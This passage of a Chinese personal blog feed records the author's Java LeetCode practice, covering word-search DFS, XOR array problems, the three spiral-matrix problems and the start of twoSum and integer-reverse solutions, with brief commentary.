class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> objRet = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">existDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book, <span class="keyword">char</span>[] wordArray, <span class="keyword">int</span> wordIndex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (wordIndex == wordArray.length)&#123;</span><br><span class="line">            <span class="keyword">this</span>.objRet = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (row &gt;= height || row &lt; <span class="number">0</span> || col &gt;= width || col &lt; <span class="number">0</span> ) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (book[row][col] == <span class="number">1</span> || board[row][col] != wordArray[wordIndex]) <span class="keyword">return</span>;</span><br><span class="line">        book[row][col] = <span class="number">1</span>;</span><br><span class="line">        wordIndex++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = step[i][<span class="number">0</span>] + row;</span><br><span class="line">            <span class="keyword">int</span> post_y = step[i][<span class="number">1</span>] + col;</span><br><span class="line">    </span><br><span class="line">            existDfs(board, post_x, post_y, book, wordArray, wordIndex);</span><br><span class="line">        &#125;</span><br><span class="line">        book[row][col] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] wordArray = word.toCharArray();</span><br><span class="line">        height = board.length;</span><br><span class="line">        width = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j] == wordArray[<span class="number">0</span>])&#123;</span><br><span class="line">                        <span class="keyword">int</span>[][] book = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">                        <span class="comment">// 开始进行dfs搜索，如果搜索成功就将ret赋值为true</span></span><br><span class="line">                        existDfs(board,i,j,book,wordArray,<span class="number">0</span>);</span><br><span class="line">                        <span class="comment">// 判断在进行dfs后是否找到矩阵中相应单词</span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.objRet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次写的代码，虽然过了，但是效率也太低了。。。服了</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210428201652066.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">existDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book, <span class="keyword">char</span>[] wordArray, <span class="keyword">int</span> wordIndex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (row &gt;= height || row &lt; <span class="number">0</span> || col &gt;= width || col &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (board[row][col] != wordArray[wordIndex] || book[row][col] == <span class="number">1</span>)<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (wordIndex == wordArray.length-<span class="number">1</span>)<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> ret = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = step[i][<span class="number">0</span>] + row;</span><br><span class="line">            <span class="keyword">int</span> post_y = step[i][<span class="number">1</span>] + col;</span><br><span class="line">            book[row][col] = <span class="number">1</span>;</span><br><span class="line">            ret =  existDfs(board, post_x, post_y, book, wordArray, wordIndex+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="keyword">true</span>)<span class="keyword">break</span>;</span><br><span class="line">            book[row][col] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 首先将返回值设置为false</span></span><br><span class="line"><span class="comment">        * 如果dfs出一个完整的单词链则将返回值设置为true，并且直接break</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * 首先需要遍历表，只对应单词的首字符</span></span><br><span class="line"><span class="comment">        * 首字母存在就直接进行dfs遍历</span></span><br><span class="line"><span class="comment">        * 遍历的方向只有四个方向</span></span><br><span class="line"><span class="comment">        * 还需要回溯，如果道路不符合需要把之前走过的路全部清0</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] wordArray = word.toCharArray();</span><br><span class="line">        height = board.length;</span><br><span class="line">        width = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span>[][] book = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">                <span class="keyword">if</span> (existDfs(board,i,j,book,wordArray,<span class="number">0</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解码异或后的数组"><a href="#解码异或后的数组" class="headerlink" title="解码异或后的数组"></a>解码异或后的数组</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210506163333259.png"></p><p>简单的签到题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span>[] decode(<span class="keyword">int</span>[] encoded, <span class="keyword">int</span> first) &#123;</span><br><span class="line">        <span class="keyword">int</span> decodedLength = encoded.length + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] decoded = <span class="keyword">new</span> <span class="keyword">int</span>[decodedLength];</span><br><span class="line">        decoded[<span class="number">0</span>] = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; encoded.length; i++) &#123;</span><br><span class="line">            decoded[i+<span class="number">1</span>] = encoded[i] ^ decoded[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组异或操作"><a href="#数组异或操作" class="headerlink" title="数组异或操作"></a>数组异或操作</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210507191525048.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210507191723896.png"></p><p>两天都是简单的签到题？感觉这道题随便都可以跑到100%</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> retNum = start;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            retNum ^= start+i*<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅰ"><a href="#螺旋矩阵Ⅰ" class="headerlink" title="螺旋矩阵Ⅰ"></a>螺旋矩阵Ⅰ</h2><p>开始螺旋矩阵三部曲冲冲冲🐱‍🏍</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210506163449701.png"></p><p>经典题目，学C语言的时候看过没写过，写关于矩阵的东西需要找到矩阵变化规律。</p><p>网上找的图，就是把四条边动态化（反正这个思路我是想不出来）。矩阵的上下两条边对应，左右两条边对应，一边在加则另一边减，直到两条边重合。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/bVbCfPh.webp"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路:</span><br><span class="line">定义矩阵的四条边</span><br><span class="line">每当遍历完一层这条边就减1</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">spiralOrder</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            * 定义四个边界</span></span><br><span class="line"><span class="comment">            * 两两对应</span></span><br><span class="line"><span class="comment">            * 一边加就一边减*/</span></span><br><span class="line">            <span class="keyword">int</span> up = <span class="number">0</span>,down = matrix.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> left = <span class="number">0</span>,right = matrix[<span class="number">0</span>].length - <span class="number">1</span>;</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = left; i &lt;= right; i++) &#123;</span><br><span class="line">                    list.add(matrix[up][i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (++up&gt;down)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down; i++) &#123;</span><br><span class="line">                    list.add(matrix[i][right]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (--right &lt; left)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left ; i--) &#123;</span><br><span class="line">                    list.add(matrix[down][i]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (--down &lt; up)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; i--) &#123;</span><br><span class="line">                    list.add(matrix[i][left]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (++left &gt; right)<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅱ"><a href="#螺旋矩阵Ⅱ" class="headerlink" title="螺旋矩阵Ⅱ"></a>螺旋矩阵Ⅱ</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210508003913353.png"></p><p>和螺旋矩阵Ⅰ的思路是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span>[][] generateMatrix(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> up = <span class="number">0</span>, down = n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[][] matrix = <span class="keyword">new</span> <span class="keyword">int</span>[n][n];</span><br><span class="line">        <span class="keyword">int</span> num=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= right; i++) &#123;</span><br><span class="line">                matrix[up][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (++up&gt;down)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down ; i++) &#123;</span><br><span class="line">                matrix[i][right] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (--right &lt; left)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = right; i &gt;= left ; i--) &#123;</span><br><span class="line">                matrix[down][i] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (--down &lt; up)<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; i--) &#123;</span><br><span class="line">                matrix[i][left] = num++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (++left&gt;right)<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> matrix;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅲ"><a href="#螺旋矩阵Ⅲ" class="headerlink" title="螺旋矩阵Ⅲ"></a>螺旋矩阵Ⅲ</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210508004424560.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210508004450737.png"></p><p>两种思路：</p><ul><li>和上面的思路一样，动态模拟四条边</li><li>找规律，通过观察可知，每次右移和下移走的步数是奇数，左移和上移走的步数是偶数，所以可以以起始点为中心（上图其实都表示出来了），定义一个正方形，遍历这个正方形的所有坐标，如果坐标范围在矩形内，则符合条件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkPost</span><span class="params">(<span class="keyword">int</span> R,<span class="keyword">int</span> C,<span class="keyword">int</span> r0,<span class="keyword">int</span> c0)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r0&gt;=R || r0&lt;<span class="number">0</span> || c0&gt;=C || c0&lt;<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] spiralMatrixIII(<span class="keyword">int</span> R, <span class="keyword">int</span> C, <span class="keyword">int</span> r0, <span class="keyword">int</span> c0) &#123;</span><br><span class="line">        <span class="comment">// 输入参数，矩阵宽高，起始位置</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 将不规则矩阵看成正方形</span></span><br><span class="line"><span class="comment">         * 模拟上下左右边界</span></span><br><span class="line"><span class="comment">         * 单独设置一个技术变量判断是否遍历完成</span></span><br><span class="line"><span class="comment">         * 遍历方向：右，下，左，上*/</span></span><br><span class="line">        <span class="keyword">int</span>[][] arr = <span class="keyword">new</span> <span class="keyword">int</span>[R*C][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> max = R&gt;=C?R:C;</span><br><span class="line">        arr[num][<span class="number">0</span>] = r0;</span><br><span class="line">        arr[num][<span class="number">1</span>] = c0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= max*<span class="number">2</span>; i+=<span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                c0+=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">                r0 += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i+<span class="number">2</span>; j++) &#123;</span><br><span class="line">                c0 -=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; i+<span class="number">2</span>; j++) &#123;</span><br><span class="line">                r0 -= <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (checkPost(R,C,r0,c0))&#123;</span><br><span class="line">                    ++num ;</span><br><span class="line">                    arr[num][<span class="number">0</span>]=r0;</span><br><span class="line">                    arr[num][<span class="number">1</span>]=c0;</span><br><span class="line"><span class="comment">//                    System.out.println(&quot;x,y: &quot;+r0+&quot;,&quot;+c0);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210521162901699.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;Hanota&quot;&gt;&lt;a href=&quot;#Hanota&quot; class=&quot;headerlink&quot; title=&quot;Hanota&quot;&gt;&lt;/a&gt;Hanota&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.o</summary>
      
    
    
    
    
    <category term="leetcode" scheme="http://example.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>leetcode刷题记录-1</title>
    <link href="http://example.com/41353/"/>
    <id>http://example.com/41353/</id>
    <published>2021-07-14T04:44:17.510Z</published>
    <updated>2022-01-01T09:53:03.640Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="towsum"><a href="#towsum" class="headerlink" title="towsum"></a>towsum</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426220730463.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">       <span class="keyword">int</span>[] index = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">               <span class="keyword">if</span> (nums[i] + nums[j] == target &amp;&amp; i != j) &#123;</span><br><span class="line">                   index[<span class="number">0</span>] = i;</span><br><span class="line">                   index[<span class="number">1</span>] = j;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> index;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><p>hashMap</p><p>上面的方法在时间复杂堵上为O(n*n)，在数据过大时十分暴力，可以采用哈希表来检索</p></li></ul><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426220647641.png"></p><p>看到别人的做法才感觉好厉害，思路非常灵活。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210413000228867.png"></p><p>这种根据原理判断整数是否溢出虽然比较科学，但感觉没有榜一大哥那么有灵性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span 